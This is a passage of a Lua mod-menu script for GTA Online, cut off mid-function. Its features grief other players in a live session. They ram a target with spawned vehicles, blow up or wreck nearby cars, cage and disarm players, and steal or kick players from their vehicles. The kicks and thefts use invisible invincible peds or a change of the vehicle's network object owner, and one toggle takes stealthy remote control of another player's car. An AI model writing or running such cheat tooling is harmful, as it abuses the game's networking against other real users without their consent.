menu.action(givevehicle, "Give A Future Shock Scarab", {"givescarab"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " scarab2")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give Aqua Blazer", {"giveblazer"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " blazer5")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Lazer", {"givelazer"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " lazer")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Hydra", {"givehydra"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " hydra")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Starling", {"givestarling"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " starling")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Pyro", {"givepyro"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " pyro")
end, nil, nil, COMMANDPERM_FRIENDLY)


menu.action(health_sub_vehicle_tab,"Repair Vehicle", {"fixveh"}, "Repairs player's vehicle", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_FIXED(veh)
end
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(health_sub_vehicle_tab,"Repair Vehicle Shell", {"repair"}, "Repairs player's vehicle but don't repair it's engine", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(veh)
end
end, nil, nil, COMMANDPERM_FRIENDLY)



menu.action(troll_sub_vehicle_tab, "Ramp Buggy fuck", {"rampbuggyram"}, "Sends 10 per loop.", function()
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local vehicle_req = util.joaat("dune5")
util.request_model(vehicle_req)
for i = 1, 10 do
local vehicle = entities.create_vehicle(vehicle_req, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(csPID), 0, 1, 1), ENTITY.GET_ENTITY_HEADING(id))
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
util.yield(500)
entities.delete_by_handle(vehicle)
end
end)

menu.action(troll_sub_vehicle_tab, "Phantom fuck", {"phantomram"}, "Sends 10 per loop.", function()
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local vehicle_req = util.joaat("phantom2")
util.request_model(vehicle_req)
for i = 1, 10 do
local vehicle = entities.create_vehicle(vehicle_req, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(csPID), 0, 1, 1), ENTITY.GET_ENTITY_HEADING(id))
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
util.yield(500)
entities.delete_by_handle(vehicle)
end
end)

menu.action(troll_sub_vehicle_tab,"Honk Car", {"honkcar"}, "Honks.", function(on)
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
end
end)

menu.action(troll_sub_vehicle_tab, "Sound Car Alarm", {"soundalarm"}, "", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_ALARM(veh, true)
VEHICLE.START_VEHICLE_ALARM(veh)
end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(troll_sub_vehicle_tab, "Car Ram", {"ram"}, "Don't drink and drive, folks", function()
menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(csPID) .. " on")
util.yield(1500)
local hash = util.joaat("baller")
local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID), true)
if STREAMING.IS_MODEL_A_VEHICLE(hash) then
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local Coords1 = PlayerCoords.y + 10
local Coords2 = PlayerCoords.y - 10
local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
end
util.yield(5000)
menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(csPID) .. " off")
end)


local plates = menu.list(troll_sub_vehicle_tab, "Fuck Plates", {}, "")

menu.action(plates,"Genesis Plate Text", {"Genesisplate"}, "Genesisplate", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, "Genesis")
end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(plates,"TRUMP Plate Text", {"trumpplate"}, "Sets player's vehicle plate text to TRUMP", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, "TRUMP")
end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(plates,"TRASH Plate Text", {"trashplate"}, "Sets player's vehicle plate text to TRASH", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, "TRASH")
end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(plates,"Bitch Plate Text", {"bitchplate"}, "Sets player's vehicle plate text to Bitch", function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, "Bitch")
end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(troll_sub_vehicle_tab,"Fuck up all cars", {"fuckupcars"}, "Beats the SHIT out of all nearby cars. But this damage is only local.", function(on)
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
local locspeed2 = speed
local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID), true)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
end
end
end)

menu.toggle_loop(troll_sub_vehicle_tab,"Honk all cars", {"honkcars"}, "Honkss the SHIT out of all nearby cars.", function(on)
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
local locspeed2 = speed
local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID), true)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
end
end
end)

menu.toggle_loop(troll_sub_vehicle_tab,"Blow up all cars", {"blowupcars"}, "Blows the SHIT out of all nearby cars.", function(on)
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
local locspeed2 = speed
local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID), true)
if not PED.IS_PED_A_PLAYER(PedInSeat) then
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
end
end
end
end)

menu.toggle(troll_sub_vehicle_tab, "Stealth Remote Control", {"stealthremote"}, "Enters there vehicle without them knowing and exits the same way. Note: It will disable them using that car until spawned again.", function(on_toggle)
if on_toggle then
menu.trigger_commands("tpmyspot")
menu.trigger_commands("invisibility" .. " On")
menu.trigger_commands("otr")
menu.trigger_commands("tpveh" .. players.get_name(csPID))
menu.trigger_commands("rc" .. " On")
else
menu.trigger_commands("otr")
menu.trigger_commands("rc" .. " Off")
menu.trigger_commands("undoteleport")
menu.trigger_commands("invisibility" .. " Off")
end
end)

menu.toggle_loop(troll_sub_vehicle_tab, "Glitch Vehicle V1", {"glitchvehv1"}, "", function()
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
local glitch_hash = util.joaat("p_spinning_anus_s")
STREAMING.REQUEST_MODEL(glitch_hash)
while not STREAMING.HAS_MODEL_LOADED(glitch_hash) do
util.yield()
end
if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
util.toast("Player isn't in a vehicle. :/")
return
end
glitched_object = entities.create_object(glitch_hash, playerpos)
ENTITY.SET_ENTITY_VISIBLE(glitched_object, false)
ENTITY.SET_ENTITY_INVINCIBLE(glitched_object, true)
ENTITY.SET_ENTITY_COLLISION(glitched_object, true, true)
util.yield(100)
entities.delete_by_handle(glitched_object)
util.yield()
end)


menu.toggle_loop(troll_sub_vehicle_tab,"Glitch Vehicle V2", {"glitchvehv2"}, "Spins them around",function()
for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0, 0, -10, true, false, true) -- Down
util.yield(100)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0, 10, 0, true, false, true) -- North
util.yield(100)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0, -10, 0, true, false, true) -- South
util.yield(100)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 10, 0, 0, true, false, true) -- East
util.yield(100)
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, -10, 0, 0, true, false, true) -- West
util.yield(100)
end
end)





menu.action(vehicle_kicks, "Steal Vehicle V2", {"stealv2"}, "Spawns a ped to take them out of their vehicle and drives away.", function() -- Skidded from femboy girl prishum
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = players.get_position(csPID)
local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)

if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
util.toast(lang.get_localised(1067523721):gsub("{}", players.get_name(csPID)))
return end
local spawned_ped = PED.CREATE_RANDOM_PED(pos.x, pos.y - 10, pos.z)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_ped)
entities.set_can_migrate(entities.handle_to_pointer(spawned_ped), false)
ENTITY.SET_ENTITY_INVINCIBLE(spawned_ped, true)
ENTITY.SET_ENTITY_VISIBLE(spawned_ped, false)
ENTITY.FREEZE_ENTITY_POSITION(spawned_ped, true)
PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(spawned_ped, true)
PED.CAN_PED_RAGDOLL(spawned_ped, false)
PED.SET_PED_CONFIG_FLAG(spawned_ped, 26, true)
TASK.TASK_ENTER_VEHICLE(spawned_ped, vehicle, 1000, -1, 1.0, 2|8|16, pos)
util.yield(1500)
if TASK.GET_IS_TASK_ACTIVE(ped, 2) then
repeat
util.yield()
until not TASK.GET_IS_TASK_ACTIVE(ped, 2) or PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false)
TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6)
util.toast("Now your vehcile!")
else
util.toast("Failed to steal players vehicle. :/")
entities.delete_by_handle(spawned_ped)
end
if not TASK.GET_IS_TASK_ACTIVE(spawned_ped) then
repeat
TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6) -- giving task again cus doesnt work sometimes
util.yield()
until TASK.GET_IS_TASK_ACTIVE(spawned_ped)
end
end)

menu.action(vehicle_kicks, "Steal Vehicle V4", {"stealv4"}, "Changes the net object owner of the vehicle.", function()
local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
util.yield(50)
ChangeNetObjOwner(veh, csPID)
ChangeNetObjOwner(veh, pped)
util.yield(50)
PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
end)


local Steal
local fail_count = 0
Steal = menu.action(vehicle_kicks, "Kick from Vehicle", {"kickfromveh"}, "", function()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = players.get_position(csPID)
local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)

if PED.IS_PED_IN_VEHICLE(ped, vehicle, false) then
local spawned_ped = PED.CREATE_RANDOM_PED(pos.x, pos.y - 10, pos.z)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_ped)
entities.set_can_migrate(entities.handle_to_pointer(spawned_ped), false)
ENTITY.SET_ENTITY_INVINCIBLE(spawned_ped, true)
ENTITY.SET_ENTITY_VISIBLE(spawned_ped, false)
ENTITY.FREEZE_ENTITY_POSITION(spawned_ped, true)
PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(spawned_ped, true)
PED.CAN_PED_RAGDOLL(spawned_ped, false)
PED.SET_PED_CONFIG_FLAG(spawned_ped, 26, true)
TASK.TASK_ENTER_VEHICLE(spawned_ped, vehicle, 1000, -1, 1.0, 2|8|16, pos)
util.yield(1000)
if TASK.GET_IS_TASK_ACTIVE(ped, 2) then
repeat
    util.yield()
until not TASK.GET_IS_TASK_ACTIVE(ped, 2)
end
if fail_count >= 5 then
util.toast("Failed to steal player too many times. Disabling feature...")
fail_count = 0
Steal.value = false
end
if PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false) then
util.yield(1500)
TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6)
fail_count = 0
else
fail_count += 1
entities.delete_by_handle(spawned_ped)
end
util.yield(500)
end
end, function()
fail_count = 0
end)

local Steal
local fail_count = 0
Steal = player_toggle_loop(vehicle_kicks, csPID, "Auto Kick Vehicle", {"autokick"}, "Will keep kicking any vehicle they try to drive.", function()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = players.get_position(csPID)
local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)

if PED.IS_PED_IN_VEHICLE(ped, vehicle, false) then
local spawned_ped = PED.CREATE_RANDOM_PED(pos.x, pos.y - 10, pos.z)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_ped)
entities.set_can_migrate(entities.handle_to_pointer(spawned_ped), false)
ENTITY.SET_ENTITY_INVINCIBLE(spawned_ped, true)
ENTITY.SET_ENTITY_VISIBLE(spawned_ped, false)
ENTITY.FREEZE_ENTITY_POSITION(spawned_ped, true)
PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(spawned_ped, true)
PED.CAN_PED_RAGDOLL(spawned_ped, false)
PED.SET_PED_CONFIG_FLAG(spawned_ped, 26, true)
TASK.TASK_ENTER_VEHICLE(spawned_ped, vehicle, 1000, -1, 1.0, 2|8|16, pos)
util.yield(1000)
if TASK.GET_IS_TASK_ACTIVE(ped, 2) then
repeat
    util.yield()
until not TASK.GET_IS_TASK_ACTIVE(ped, 2)
end
if fail_count >= 5 then
util.toast("Failed to steal player too many times. Disabling feature...")
fail_count = 0
Steal.value = false
end
if PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false) then
util.yield(1500)
TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6)
fail_count = 0
else
fail_count += 1
entities.delete_by_handle(spawned_ped)
end
util.yield(500)
end
end, function()
fail_count = 0
end)


        --Trolling Cage Options

cages = {}  -- 1114264700 <- vending machine cage
function cage_player(pos)
local object_hash = util.joaat("prop_gold_cont_01b")
pos.z = pos.z-0.9

STREAMING.REQUEST_MODEL(object_hash)
while not STREAMING.HAS_MODEL_LOADED(object_hash) do
util.yield()
end
local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
cages[#cages + 1] = object1

local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
cages[#cages + 1] = object2

if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those
end
ENTITY.FREEZE_ENTITY_POSITION(object1, true)
ENTITY.FREEZE_ENTITY_POSITION(object2, true)
local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
rot.x = -180
rot.y = -180
ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end


        cage_options = menu.list(MenuPlayerTrollingCage, "Cage Options", {}, "")

menu.action(cage_options, "Garage Cage All Players", {"cageall"}, "Garage Cage all players", function()
for _, csPID in players.list(false, true, true) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = players.get_position(csPID)
if ENTITY.DOES_ENTITY_EXIST(ped) then
menu.trigger_commands("garagecage " .. players.get_name(csPID))
end
end
end)

menu.action(cage_options, "Send All Cages", {"sendallcages"}, "", function(action)
menu.trigger_commands("garagecage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("basketcage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("simplecage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("foodtruckcage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("doghousecage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("jollycage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("jollycage2" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("jollycage3" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("safecage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("trashcage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("moneycage" .. players.get_name(csPID))
util.yield(100)
menu.trigger_commands("stuntcage" .. players.get_name(csPID))
util.yield(100)
end)

menu.action(cage_options, "Arcade Basketball", {"basketcage"}, "", function()
menu.trigger_commands("disarm" .. players.get_name(csPID))
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
STREAMING.REQUEST_MODEL(2769149392)
while not STREAMING.HAS_MODEL_LOADED(2769149392) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(2769149392, pos.x, pos.y, pos.z, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 0
ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(cage_options, "Simple", {"simplecage"}, "", function()
local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(csPID).." on")
util.yield(300)
if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(csPID).." off")
return
end
menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(csPID).." off")
pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)) --if not it could place the cage at the wrong position
menu.trigger_commands("disarm" .. players.get_name(csPID))
end
cage_player(pos)
end)

menu.action(cage_options, "First Job", {"foodtruckcage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = 4022605402
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "Married Simulator", {"doghousecage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = -1782242710
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "Christmas Time", {"jollycage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = 238789712
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = util.joaat("ch_prop_tree_02a")
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
cages[#cages + 1] = cage_object
cages[#cages + 1] = cage_object
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = util.joaat("ch_prop_tree_03a")
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
cages[#cages + 1] = cage_object
cages[#cages + 1] = cage_object
util.yield()
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "'Safe' Space", {"safecage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = 1089807209
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
cages[#cages + 1] = cage_object
ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "Average X-Force User", {"trashcage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = 684586828
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "money cage", {"moneycage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = util.joaat("bkr_prop_moneypack_03a")
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

